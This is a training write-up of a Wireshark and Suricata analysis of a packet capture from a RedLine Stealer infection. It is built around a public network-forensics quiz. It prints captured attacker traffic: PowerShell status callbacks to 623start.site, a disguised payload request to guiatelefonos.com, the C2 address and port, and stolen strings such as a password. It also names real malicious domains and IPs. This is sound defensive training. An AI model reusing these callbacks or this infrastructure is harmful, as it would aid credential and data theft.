# RedLine Stealer Wireshark Analysis

**Date:** July 12, 2024

**Author:** Garrett Jones

**Challenge Sources**
- https://malware-traffic-analysis.net/training-exercises.html
- https://unit42.paloaltonetworks.com/wireshark-quiz-redline-stealer/

**Concepts:** Network Forensics, Malware Analysis, Wireshark, Suricata

# Scenario

RedLine Stealer is an information-stealing malware family designed to harvest login credentials, cryptocurrency wallets, browser data, and other sensitive information from compromised Windows systems. This Wireshark challenge analyzes a packet capture (PCAP) that marks the transition from normal network activity to a RedLine Stealer infection.

The malicious traffic in this capture originated from a RedLine Stealer infection that occurred in July 2023. By analyzing the network traffic, we can identify the infected host, determine how the malware communicates with its infrastructure, and discover what information was targeted for exfiltration.

The packet capture was collected from an Active Directory (AD) environment. The relevant network details are provided below.

## Local Area Network (LAN)

- **LAN Range:** 10.7.10.0/24
- **Gateway:** 10.7.10.1
- **Broadcast Address:** 10.7.10.255
- **Domain:** coolweathercoat.com
- **Domain Controller:** WIN-S3WT6LGQFVX
- **Domain Controller IP:** 10.7.10.9

## Objectives

- Determine when the infection began.
- Identify the infected Windows host.
- Determine the host's MAC address.
- Identify the workstation hostname.
- Identify the compromised user account.
- Determine what information RedLine attempted to steal.

# Analysis

Begin by downloading the challenge archive and extracting it using the password **infected**.

When analyzing a packet capture, the first tool I typically run is `capinfos`, a command-line utility included with Wireshark that provides a concise summary of the capture.

```bash
capinfos 2023-07-Unit42-Wireshark-quiz.pcap
```

```
File name:           2023-07-Unit42-Wireshark-quiz.pcap
File type:           Wireshark/tcpdump/... - pcap
File encapsulation:  Ethernet
...
```

The output shows that the capture contains approximately **2,500 packets** collected over only **35 seconds**. This relatively short capture window suggests that the malicious activity occurred over a brief period, making it easier to reconstruct the attack timeline.

Next, open the capture in Wireshark.

One of the first places I like to start is **Statistics → Protocol Hierarchy**, which provides a high-level overview of the protocols present in the capture and can quickly reveal unusual traffic.

<img width="946" alt="image" src="https://github.com/user-attachments/assets/3236f7ba-a958-4781-86bc-a1b63ac7432a">

The protocol hierarchy shows six HTTP packets, which immediately stand out because HTTP is often used during malware staging or command-and-control communications. These packets are worth investigating further.

## DNS Analysis

DNS traffic is often one of the fastest ways to identify suspicious activity, so I begin by filtering for:

```
dns
```

Most of the DNS queries reference **coolweathercoat.com**, which appears to be the organization's internal Active Directory domain.

To better understand its role, I searched for all packets containing the domain name using:

```
frame contains "coolweathercoat.com"
```

Reviewing the results shows Kerberos and CLDAP traffic, confirming that **coolweathercoat.com** is the legitimate internal domain used throughout the environment.

To eliminate this expected traffic and focus on external DNS activity, I refined the filter to exclude the internal domain:

```
dns && !(frame contains "coolweathercoat")
```

<img width="1542" alt="image" src="https://github.com/user-attachments/assets/3bbf1a9b-5381-4ade-a0bf-00475ff8caea">

This reduces the results to only **44 DNS packets**, making them much easier to review.

Most of these queries resolve to legitimate Microsoft infrastructure, including domains associated with Microsoft, Bing, MSN, and Azure. Near the end of the list, however, two domains immediately stand out as suspicious:

```
623start.site        195.161.114.3
guiatelefonos.com    92.118.151.9
```

Whenever I encounter unfamiliar domains during malware analysis, I verify them using VirusTotal to determine whether they have previously been associated with malicious activity.

## Verifying Suspicious Domains

When potentially malicious domains or IP addresses are identified, one of the quickest ways to gather additional context is to check them against **VirusTotal**. This helps determine whether the infrastructure has previously been associated with malware campaigns or other malicious activity.

<img width="714" alt="image" src="https://github.com/user-attachments/assets/a84583b4-f093-4407-8413-62b573ce7ace">

<img width="712" alt="image" src="https://github.com/user-attachments/assets/d40cb905-dc68-40c5-aaf4-9c3a44bb96e6">

Both domains are flagged as malicious by VirusTotal. In particular, **guiatelefonos.com** has been identified in previous RedLine Stealer campaigns. These results strongly suggest that the workstation at **10.7.10.47** is compromised, as it is the internal host communicating with these domains.

At this point, these domains and their associated IP addresses can be treated as **indicators of compromise (IOCs)** and used to guide the remainder of the investigation.

## Investigating the Initial Callback

The first IOC resolves to **195.161.114.3**, so I filtered the packet capture using:

```text
ip.addr == 195.161.114.3
```

<img width="1348" alt="image" src="https://github.com/user-attachments/assets/c14f1d74-99de-46eb-af95-dd582e221e89">

The traffic consists of several HTTP requests. To better understand their purpose, I followed the associated TCP stream.

```http
GET /?status=start&av=Windows%20Defender HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.3031
Host: 623start.site
Connection: Keep-Alive

HTTP/1.1 200 OK
...

GET /?status=install HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.3031
Host: 623start.site
```

The **User-Agent** immediately stands out because it identifies itself as **Windows PowerShell** rather than a web browser. This strongly suggests that the requests are being generated by a PowerShell script instead of normal user activity.

The first request reports:

```text
status=start
av=Windows Defender
```

followed shortly by:

```text
status=install
```

These requests appear to serve as status callbacks to the attacker's infrastructure, informing it that the malware has begun execution and reporting the antivirus software installed on the victim's system.

Collecting this information allows the attacker to confirm a successful infection and potentially tailor subsequent payloads or techniques based on the victim's security software.

No additional traffic is observed with this host, so the next step is to investigate the second suspicious IP address.

## Examining the Second Malicious Domain

The second suspicious domain resolves to **92.118.151.9**.

Filtering the capture with:

```text
ip.addr == 92.118.151.9
```

reveals more than 300 packets.

<img width="1583" alt="image" src="https://github.com/user-attachments/assets/60e9d65d-f2ae-425f-ac03-76c77142f052">

The first HTTP request immediately draws attention, so I again followed the TCP stream.

```http
GET /data/czx.jpg HTTP/1.1
Host: guiatelefonos.com
Connection: Keep-Alive
```

The server responds with:

```http
HTTP/1.1 301 Moved Permanently
Location: https://guiatelefonos.com:443/data/czx.jpg
```

At first glance, this appears to be a request for a JPEG image. However, malware frequently disguises payloads using benign-looking file extensions or innocuous filenames.

In this case, the server redirects the client to the HTTPS version of the same resource. Because this malware campaign occurred in 2023, the infrastructure has since changed, preventing us from retrieving the original payload. Nevertheless, this request likely represents the malware attempting to download an additional stage of the infection.

## Identifying the Command-and-Control Server

Continuing through the TCP streams associated with the compromised host eventually reveals another interesting connection.

Specifically, **TCP Stream 71** contains traffic that differs significantly from the earlier HTTP communications.

<img width="1249" alt="image" src="https://github.com/user-attachments/assets/41944c27-a884-443d-9b2d-3a2f241f2551">

Near the beginning of the stream, the traffic references **tempuri.org**, the default namespace commonly generated by Microsoft development frameworks. Shortly afterward, the infected workstation establishes a connection to **194.26.135.119** over TCP port **12432**.

Searching this IP address on VirusTotal provides an important clue.

<img width="738" alt="image" src="https://github.com/user-attachments/assets/8d43b6b9-ee8e-4cee-989a-612ca3675c25">

VirusTotal identifies the server as infrastructure associated with **RedLine Stealer**, confirming that this host is functioning as the malware's **command-and-control (C2) server**.

At this point, the overall attack chain becomes much clearer:

1. The victim contacts **623start.site** and reports execution status.
2. The malware attempts to retrieve an additional payload from **guiatelefonos.com**.
3. The compromised host establishes a persistent session with the RedLine command-and-control server at **194.26.135.119**, where stolen information is exchanged.

## Reviewing the C2 Traffic

The command-and-control session contains several sections of readable data before transitioning into encrypted communications.

One section lists directories and file types that the malware intends to search.

<img width="1670" alt="image" src="https://github.com/user-attachments/assets/d6815de1-1423-4851-bbd1-894d8710df52">

The configuration instructs RedLine to search for numerous file types across user directories, application folders, and AppData locations. Documents, text files, configuration files, wallet data, and other potentially valuable artifacts are all targeted.

Another section contains references to cryptocurrency wallets.

<img width="382" alt="image" src="https://github.com/user-attachments/assets/c3c4a8b0-b76a-4033-9678-4f128f2f8aae">

This configuration includes wallet names, file locations, and other cryptocurrency-related artifacts, indicating that RedLine is specifically configured to steal cryptocurrency assets in addition to traditional credentials.

Another readable section shows the malware collecting numerous Windows environment variables.

<img width="1657" alt="image" src="https://github.com/user-attachments/assets/19a55054-8e3d-4f65-9df5-0cda7b810705">

Environment variables provide valuable context about the compromised system, including usernames, profile paths, operating system configuration, and installed applications.

## Evidence of Data Exfiltration

The remainder of the TCP stream is largely encrypted, which is expected during modern malware communications.

Near the end of the stream, however, several readable strings remain visible.

<img width="1671" alt="image" src="https://github.com/user-attachments/assets/31eaee8f-9ffd-4f78-b251-4a9832016304">

Much of this data resembles process listings and command-line arguments extracted from the infected system. Embedded within the stream are several particularly valuable artifacts, including:

- `Top_secret_document.docx`
- `My_p@ssw0rd`
- `rwalters@coolweathercoat.com`
- `C:\Users\rwalters\Documents\Top_secret_document.docx`

These strings strongly suggest that the malware successfully collected sensitive user information, including filenames, user credentials, email addresses, and document metadata prior to exfiltration.

Combined with the earlier configuration data, the evidence indicates that RedLine attempted to steal:

- User credentials
- Browser data
- Documents
- Cryptocurrency wallets
- Environment variables
- System information
- Running processes
- Other sensitive user data

At this point, we have gathered enough evidence to answer the questions provided with the challenge.

# Challenge Questions

## 1. What is the date and time (UTC) when the infection started?

The earliest indicator of compromise is the first DNS query for the malicious domain **623start.site**. Shortly afterward, the infected host begins communicating with attacker-controlled infrastructure using PowerShell.

Packet **1352** contains the initial DNS lookup:

```text
1352    2023-07-10 22:39:47.364257    10.7.10.47    10.7.10.9
DNS     Standard query A 623start.site
```

Although the PowerShell script likely began executing immediately before this request, the DNS query provides the earliest observable evidence of the infection within the packet capture.

**Answer:** **2023-07-10 22:39:47 UTC**

---

## 2. What is the IP address of the infected Windows client?

Throughout the investigation, all malicious communications originate from the same internal workstation.

This host:

- Queries the malicious domains.
- Downloads the next-stage payload.
- Establishes a connection to the RedLine command-and-control server.
- Exfiltrates victim information.

The source IP associated with each stage of the attack is:

**10.7.10.47**

---

## 3. What is the MAC address of the infected Windows client?

To determine the workstation's MAC address, inspect the Ethernet header of the first malicious DNS request.

```text
Ethernet II

Destination: Dell_f4:95:c1 (10:98:36:f4:95:c1)
Source: 80:86:5b:ab:1e:c4
Type: IPv4 (0x0800)
```

The source MAC address belongs to the infected workstation.

**Answer:** **80:86:5b:ab:1e:c4**

---

## 4. What is the hostname of the infected Windows client?

Near the beginning of the capture, the workstation performs an NBNS (NetBIOS Name Service) registration.

Packet **19** contains the registration request:

```text
19    2023-07-10 22:39:23.138160
10.7.10.47 → 10.7.10.255

Registration NB DESKTOP-9PEA63H<00>
```

This reveals the workstation hostname.

**Answer:** **DESKTOP-9PEA63H**

---

## 5. What is the user account name from the infected Windows host?

Earlier in the investigation, the command-and-control traffic exposed several strings referencing the user **rwalters**. This observation can be independently verified by examining the Kerberos authentication traffic.

Packet **725** contains a **KRB5KDC_ERR_PREAUTH_REQUIRED** response.

Within the Kerberos **ETYPE-INFO2** structure, the account name appears as part of the salt value:

```text
salt: COOLWEATHERCOAT.COMrwalters
```

This confirms the username associated with the compromised workstation.

**Answer:** **rwalters**

---

## 6. What type of information did RedLine Stealer attempt to steal?

The command-and-control configuration clearly outlines the categories of information targeted by the malware.

Based on the configuration files, directory listings, and recovered plaintext strings, RedLine attempted to collect:

- User credentials
- Browser data
- Documents (`.txt`, `.doc`, `.docx`, etc.)
- Cryptocurrency wallets
- Wallet seed phrases
- Environment variables
- Application data
- Running process information
- System configuration information
- Other sensitive files stored throughout the user's profile

The recovered strings found within the C2 traffic—including document names, email addresses, and credentials—indicate that at least some of this information was successfully collected before being transmitted to the attacker.

---

# Alternative Detection Using Suricata

While manually inspecting packet captures is an effective way to understand attacker behavior, intrusion detection systems (IDS) such as **Suricata** can significantly reduce the time required to identify malicious traffic.

To analyze the packet capture with Suricata, first configure the **HOME_NET** variable in `suricata.yaml` to match the lab environment:

```yaml
HOME_NET: "[10.7.10.0/24]"
```

Then execute the following command:

```bash
suricata \
  -c /opt/homebrew/etc/suricata/suricata.yaml \
  -l . \
  -r 2023-07-Unit42-Wireshark-quiz.pcap
```

After the analysis completes, review the generated **fast.log** file.

```text
07/10/2023-17:39:48.415597 ET INFO Windows Powershell User-Agent Usage

07/10/2023-17:39:50.753113 ET MALWARE
[ANY.RUN] RedLine Stealer/MetaStealer Family Related

07/10/2023-17:39:50.753113 ET MALWARE
RedLine Stealer/MetaStealer Family TCP CnC Activity

07/10/2023-17:39:56.522573 ET MALWARE
RedLine Stealer/MetaStealer Family Activity (Response)
```

Several alerts immediately stand out.

The initial alerts identify PowerShell-based HTTP communications, which correlate with the callback requests observed during manual analysis.

More importantly, multiple signatures explicitly identify **RedLine Stealer** command-and-control traffic. These alerts quickly confirm that the infected workstation established communication with known RedLine infrastructure.

Although automated detection tools can rapidly identify malicious activity, manually analyzing the packet capture provides considerably more context. By following the network traffic directly, we can reconstruct the attack sequence, understand the malware's behavior, identify the data targeted for exfiltration, and independently verify the conclusions produced by Suricata.

# Conclusion

This exercise demonstrates a typical network centered malware investigation using Wireshark.

Beginning with basic DNS analysis, we identified suspicious external domains, validated them using VirusTotal, traced the malware's HTTP communications, identified the RedLine command-and-control server, and recovered evidence of data exfiltration.

The investigation revealed that the compromised workstation **10.7.10.47** was infected with **RedLine Stealer**, which attempted to collect documents, credentials, browser data, cryptocurrency wallet information, environment variables, and other sensitive system information before transmitting the data to attacker-controlled infrastructure.

Although intrusion detection systems such as Suricata rapidly detected the malicious traffic, manually examining the packet capture provided significantly greater insight into each phase of the attack. Combining both approaches offers an efficient workflow for identifying malware while still developing a thorough understanding of attacker behavior.